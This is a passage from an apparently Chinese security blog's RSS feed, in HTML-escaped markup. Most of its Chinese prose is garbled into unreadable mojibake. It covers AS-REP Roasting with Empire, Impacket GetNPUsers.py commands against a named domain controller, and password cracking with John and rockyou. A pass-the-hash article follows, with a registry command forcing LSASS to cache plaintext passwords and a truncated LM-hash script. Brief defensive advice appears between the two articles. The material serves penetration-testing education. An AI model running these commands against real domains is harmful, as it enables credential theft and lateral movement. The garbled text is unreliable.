&lt;p&gt;å¦‚æœä½ å–œæ¬¢ä½¿ç”¨Powershell Empireè¿™ä¸ªæ¡†æ¶ï¼Œå¹¶ä¸”æƒ³é€šè¿‡Empireè¿™ä¸ªæ¡†æ¶å‘èµ·ASREPRoastæ”»å‡»ï¼Œé¦–å…ˆä½ å¾—æ‹¿ä¸‹ä¸€å°æœºå™¨ï¼Œè·å¾—agentä¼šè¯ï¼Œç„¶åè¿è¡Œä¸‹é¢è¿™ä¸ªæ¨¡å—æ¥æŸ¥çœ‹â€œPreauthNotRequired â€é€‰é¡¹æœ‰æ²¡æœ‰å‹¾é€‰ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usemodule situational_awareness/network/powerview/get_user
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/10.png&#34; alt=&#34;10&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¯¥åŠŸèƒ½åªèƒ½æšä¸¾å‡ºå­˜åœ¨æ¼æ´çš„ç”¨æˆ·ï¼Œåç»­è¿˜æ˜¯å¾—ä½¿ç”¨Rubeusç­‰å·¥å…·è¿›è¡Œå¯¼å‡ºhashå€¼ã€‚&lt;/p&gt;
&lt;h2 id=&#34;getnpuserspy&#34;&gt;GetNPUsers.py&lt;/h2&gt;
&lt;p&gt;è¯¥å·¥å…·æ˜¯åœ¨&lt;strong&gt;Impacket&lt;/strong&gt;ä¸­çš„ï¼Œä¹Ÿé»˜è®¤å®‰è£…åœ¨æ–°ç‰ˆçš„kaliã€‚è¿™ä¸ªè„šæœ¬æ˜¯Impacketå·¥å…·å¥—ä»¶ä¸­çš„å…¶ä¸­ä¸€ä¸ªï¼Œå®ƒå¯ä»¥åˆ—ä¸¾å‡ºå“ªäº›ç”¨æˆ·è®¾ç½®äº†â€œDo not require Kerberos pre-authenticationâ€ï¼Œå¹¶è·å¾—TGTç¥¨æ®ã€‚&lt;/p&gt;
&lt;p&gt;åŒæ ·çš„ï¼Œä½ ä¹Ÿå¯ä»¥ä¿å­˜hashåˆ°æ–‡ä»¶ä¸­ï¼Œç„¶ååˆ©ç”¨John the ripperè¿›è¡Œç ´è§£ï¼ˆé»˜è®¤æ˜¯hashcatçš„æ ¼å¼ï¼‰ï¼ŒæŒ‡å®šå•ç”¨æˆ·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 /usr/local/bin/GetNPUsers.py hack.lab/lucky -no-pass -dc-ip 172.16.0.106 -format john -outputfile hash.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¤šç”¨æˆ·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 /usr/local/bin/GetNPUsers.py -no-pass -dc-ip 172.16.0.106 -usersfile users.txt -format john -outputfile hash.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;172.16.0.106æ˜¯åŸŸæ§&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/8.png&#34; alt=&#34;8&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨johnç ´è§£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;john â€“wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt hash.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;0x03-é˜²å¾¡å»ºè®®&#34;&gt;0x03 é˜²å¾¡å»ºè®®&lt;/h1&gt;
&lt;p&gt;1.ç¡®ä¿åŸŸå†…ä¸å­˜åœ¨å¼€å¯â€Do not require Kerberos preauthenticationâ€çš„ç”¨æˆ·&lt;/p&gt;
&lt;p&gt;æ‰«ææ–¹æ³•(ä½¿ç”¨PowerView)ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Import-Module .\PowerView.ps1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Get-DomainUser -PreauthNotRequired -Verbose
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2.åŸŸç”¨æˆ·å¼ºåˆ¶ä½¿ç”¨å¤æ‚å£ä»¤ï¼Œæé«˜è¢«å­—å…¸å’Œæš´åŠ›ç ´è§£çš„éš¾åº¦&lt;/p&gt;
&lt;h1 id=&#34;0x04-å‚è€ƒ&#34;&gt;0x04 å‚è€ƒ&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting&#34;&gt;https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.4hou.com/posts/ZpYE&#34;&gt;https://www.4hou.com/posts/ZpYE&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/shuteer_xu/article/details/106066628&#34;&gt;https://blog.csdn.net/shuteer_xu/article/details/106066628&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xxe.icu/posts/kerberos_authentication/&#34;&gt;https://xxe.icu/posts/kerberos_authentication/&lt;/a&gt;&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>åŸŸæ¸—é€-å“ˆå¸Œä¼ é€’æ”»å‡»(Pass The Hash/Key)</title>
      <link>https://xxe.icu/ad_pass_key.html</link>
      <pubDate>Tue, 22 Feb 2022 00:04:34 +0800</pubDate>
      
      <guid>https://xxe.icu/ad_pass_key.html</guid>
      
        <description>&lt;h1 id=&#34;0x00-å‰è¨€&#34;&gt;0x00 å‰è¨€&lt;/h1&gt;
&lt;p&gt;æ¨ªå‘æ¸—é€ä¸­çš„å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œè¿™ä¸€éƒ¨åˆ†åœ¨å†…ç½‘æ¸—é€ä¸­æ˜¯ååˆ†å…³é”®çš„ã€‚åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ç™»å½•è®¡ç®—æœºæ—¶ä¸€èˆ¬ä½¿ç”¨åŸŸè´¦å·ï¼Œå¤§é‡è®¡ç®—æœºåœ¨å®‰è£…æ—¶ä¼šä½¿ç”¨ç›¸åŒçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œå› æ­¤ï¼Œå¦‚æœè®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ä¹Ÿç›¸åŒï¼Œæ”»å‡»è€…å°±èƒ½ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»çš„æ–¹æ³•æ¥ç™»å½•å†…ç½‘ä¸­çš„å…¶ä»–ä¸»æœºã€‚ä½¿ç”¨è¯¥æ–¹æ³•ï¼Œæ”»å‡»è€…ä¸éœ€è¦èŠ±è´¹æ—¶é—´æ¥å¯¹Hashè¿›è¡Œçˆ†ç ´ï¼Œåœ¨å†…ç½‘æ¸—é€é‡Œéå¸¸ç»å…¸ã€‚å¸¸å¸¸é€‚ç”¨äºåŸŸ/å·¥ä½œç»„ç¯å¢ƒã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€äº›åŸºç¡€æ¦‚å¿µï¼Œç„¶åå†è¿›è¡Œå®æˆ˜æ”»å‡»ã€‚&lt;/p&gt;
&lt;h1 id=&#34;0x01-åŸºç¡€æ¦‚å¿µ&#34;&gt;0x01 åŸºç¡€æ¦‚å¿µ&lt;/h1&gt;
&lt;h2 id=&#34;ä»€ä¹ˆæ˜¯pthæ”»å‡»&#34;&gt;ä»€ä¹ˆæ˜¯PTHæ”»å‡»&lt;/h2&gt;
&lt;p&gt;å“ˆå¸Œä¼ é€’(pth)æ”»å‡»æ˜¯æŒ‡æ”»å‡»è€…å¯ä»¥é€šè¿‡æ•è·å¯†ç çš„hashå€¼(å¯¹åº”ç€å¯†ç çš„å€¼),ç„¶åç®€å•åœ°å°†å…¶ä¼ é€’æ¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»¥æ­¤æ¥æ¨ªå‘è®¿é—®å…¶ä»–ç½‘ç»œç³»ç»Ÿã€‚ æ”»å‡»è€…æ— é¡»é€šè¿‡è§£å¯†hashå€¼æ¥è·å–æ˜æ–‡å¯†ç ã€‚å› ä¸ºå¯¹äºæ¯ä¸ªSession hashå€¼éƒ½æ˜¯å›ºå®šçš„ï¼Œé™¤éå¯†ç è¢«ä¿®æ”¹äº†(éœ€è¦åˆ·æ–°ç¼“å­˜æ‰èƒ½ç”Ÿæ•ˆ)ï¼Œæ‰€ä»¥pthå¯ä»¥åˆ©ç”¨èº«ä»½éªŒè¯åè®®æ¥è¿›è¡Œæ”»å‡»ã€‚ æ”»å‡»è€…é€šå¸¸é€šè¿‡æŠ“å–ç³»ç»Ÿçš„æ´»åŠ¨å†…å­˜å’Œå…¶ä»–æŠ€æœ¯æ¥è·å–å“ˆå¸Œã€‚&lt;/p&gt;
&lt;p&gt;è™½ç„¶å“ˆå¸Œä¼ é€’æ”»å‡»å¯ä»¥åœ¨Linux,Unixå’Œå…¶ä»–å¹³å°ä¸Šå‘ç”Ÿ,ä½†å®ƒä»¬åœ¨windowsç³»ç»Ÿä¸Šæœ€æ™®éã€‚ åœ¨Windowsä¸­ï¼Œpthé€šè¿‡NT Lan Manager(NTLM)ï¼ŒKereroså’Œå…¶ä»–èº«ä»½éªŒè¯åè®®æ¥è¿›è¡Œå•ç‚¹ç™»å½•ã€‚åœ¨Windowsä¸­åˆ›å»ºå¯†ç åï¼Œå¯†ç ç»è¿‡å“ˆå¸ŒåŒ–å¤„ç†åå­˜å‚¨åœ¨å®‰å…¨è´¦æˆ·ç®¡ç†å™¨(SAM)ï¼Œæœ¬åœ°å®‰å…¨æœºæ„å­ç³»ç»Ÿ(LSASS)è¿›ç¨‹å†…å­˜ï¼Œå‡­æ®ç®¡ç†å™¨(CredMan),Active Directoryä¸­çš„ntds.ditæ•°æ®åº“æˆ–è€…å…¶ä»–åœ°æ–¹ã€‚å› æ­¤ï¼Œå½“ç”¨æˆ·ç™»å½•windowså·¥ä½œç«™æˆ–æœåŠ¡å™¨æ—¶ï¼Œä»–ä»¬å®é™…ä¸Šä¼šç•™ä¸‹å¯†ç å‡­æ®(hash)ã€‚&lt;/p&gt;
&lt;h2 id=&#34;pth-çš„å½±å“&#34;&gt;PTH çš„å½±å“&lt;/h2&gt;
&lt;p&gt;ä»Windows Vistaå’ŒWindows Server 2008å¼€å§‹ï¼Œå¾®è½¯é»˜è®¤ç¦ç”¨LM hashã€‚åœ¨Windows Server 2012 R2åŠä¹‹åç‰ˆæœ¬çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œé»˜è®¤ä¸ä¼šåœ¨å†…å­˜ä¸­ä¿å­˜æ˜æ–‡å¯†ç ï¼ŒMimikatz å°±è¯»ä¸åˆ°å¯†ç æ˜æ–‡ï¼Œåªèƒ½è¯»å–å“ˆå¸Œå€¼ã€‚è™½ç„¶æ­¤æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼æŠ“å–æ˜æ–‡ï¼Œä½†éœ€è¦ç”¨æˆ·é‡æ–°ç™»å½•åæ‰èƒ½æˆåŠŸæŠ“å–ã€‚ä¿®æ”¹æ³¨å†Œè¡¨å‘½ä»¤ä¸ºï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åå¼ºåˆ¶è¦æ±‚lsass.exeæ¥ç¼“å­˜æ˜æ–‡å¯†ç å†è¿›è¡ŒæŠ“å–ï¼Œä½†æ˜¯è¿™ç§æ–¹å¼è¦æ±‚ç³»ç»Ÿé‡å¯æˆ–è€…ç”¨æˆ·é‡æ–°ç™»å½•ï¼Œåœ¨å®æˆ˜ä¸­æ“ä½œèµ·æ¥æˆåŠŸç‡è¿˜æ˜¯æ¯”è¾ƒä½çš„ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡æ˜æ–‡å¯†ç æ¥æ¨ªå‘ç§»åŠ¨æ˜¯æå…¶æœ‰æ•ˆçš„ï¼Œä¸€ä¸ªæ˜¯é€šç”¨å¼±å£ä»¤ï¼Œä¸€ä¸ªæ˜¯å¯†ç è§„å¾‹çš„çŒœæµ‹ï¼Œåœ¨å¤§é‡æœºå™¨çš„ç¯å¢ƒä¸­éƒ½æ˜¯å¾ˆå¯èƒ½å­˜åœ¨çš„ï¼Œä½†æ˜¯éšç€ç³»ç»Ÿç‰ˆæœ¬è¿­ä»£ï¼Œæˆ‘ä»¬è·å–åˆ°æ˜æ–‡å¯†ç çš„éš¾åº¦è¶Šæ¥è¶Šå¤§ï¼Œä½†æ˜¯hashçš„è·å–æ˜¯å›ºå®šå­˜åœ¨çš„ï¼Œå› ä¸ºwindowä¸­ç»å¸¸éœ€è¦ç”¨hashæ¥è¿›è¡ŒéªŒè¯å’Œäº¤äº’ã€‚æ‰€ä»¥åˆ©ç”¨hashæ¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨åœ¨å†…ç½‘æ¸—é€ä¸­ç»å¸¸å……å½“ä¸»åŠ›çš„è§’è‰²ã€‚&lt;/p&gt;
&lt;h2 id=&#34;hashçš„è®¤è¯†&#34;&gt;Hashçš„è®¤è¯†&lt;/h2&gt;
&lt;p&gt;æ—¢ç„¶æ˜¯pass the hashï¼Œé‚£ä¹ˆæˆ‘å°±å…ˆæ¥äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯Windowsä¸­çš„Hashã€‚&lt;/p&gt;
&lt;p&gt;åœ¨å‰é¢å†™äº†å‡ éæœ‰å…³äºNTLMçš„æ–‡ç« ï¼Œå¤§å®¶å¯ä»¥ç»“åˆèµ·æ¥ä¸€èµ·å­¦ä¹ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xxe.icu/posts/responder_ntlmv2/&#34;&gt;ä½¿ç”¨Responderè¿›è¡ŒNTLMé‡æ”¾æ”»å‡»&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xxe.icu/posts/domain-security/#1ntlm&#34;&gt;Windowsè®¤è¯ä¸åŸŸæ¸—é€&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;lm-hash&#34;&gt;LM Hash&lt;/h3&gt;
&lt;p&gt;LM(LAN Mannager) åè®®ä½¿ç”¨çš„hashå°±å«åš LM Hash, ç”±IBMè®¾è®¡å’Œæå‡º, åœ¨è¿‡å»æ—©æœŸä½¿ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;ç”±äºå…¶å­˜åœ¨æ¯”è¾ƒå¤šçš„ç¼ºç‚¹ï¼Œæ¯”è¾ƒå®¹æ˜“ç ´è§£ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è‡ªWindowsVistaå’ŒWindows Server 2008å¼€å§‹,Windowså–æ¶ˆLM hashã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯åœ¨win2003ä¸­è¿˜æ˜¯å­˜åœ¨çš„,é€šè¿‡çˆ†ç ´LM Hashæ¥è·å–æ˜æ–‡è¿˜æ˜¯æ¯”è¾ƒå¯è¡Œçš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ptk/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;LM Hashç”Ÿæˆè¿‡ç¨‹&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;ç”¨æˆ·çš„å¯†ç è¢«é™åˆ¶ä¸ºæœ€å¤š14ä¸ªå­—ç¬¦ã€‚&lt;/li&gt;
&lt;li&gt;ç”¨æˆ·çš„å¯†ç è½¬æ¢ä¸ºå¤§å†™ã€‚&lt;/li&gt;
&lt;li&gt;å¯†ç è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸è¶³14å­—èŠ‚å°†ä¼šç”¨0æ¥å†åé¢è¡¥å…¨ã€‚&lt;/li&gt;
&lt;li&gt;å¯†ç çš„16è¿›åˆ¶å­—ç¬¦ä¸²è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†ã€‚æ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä½56bitï¼Œé•¿åº¦ä¸è¶³ä½¿ç”¨0åœ¨å·¦è¾¹è¡¥é½é•¿åº¦ï¼Œå†åˆ†7bitä¸ºä¸€ç»„æœ«å°¾åŠ 0ï¼Œç»„æˆæ–°çš„ç¼–ç ï¼ˆstr_to_key()å‡½æ•°å¤„ç†ï¼‰&lt;/li&gt;
&lt;li&gt;ä¸Šæ­¥éª¤å¾—åˆ°çš„8byteäºŒç»„ï¼Œåˆ†åˆ«ä½œä¸ºDES keyä¸º&amp;quot;KGS!@#$%&amp;ldquo;è¿›è¡ŒåŠ å¯†ã€‚&lt;/li&gt;
&lt;li&gt;å°†äºŒç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œå¾—åˆ°æœ€ç»ˆLM HASHå€¼ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¸‹é¢æ˜¯pythonå†™çš„åŠ å¯†è„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# coding=utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;binascii&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pyDes&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DesEncrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Des_Key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Des_Key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ECB&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pad&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;EncryptStr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binascii&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b2a_hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EncryptStr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Zero_padding&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;l&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
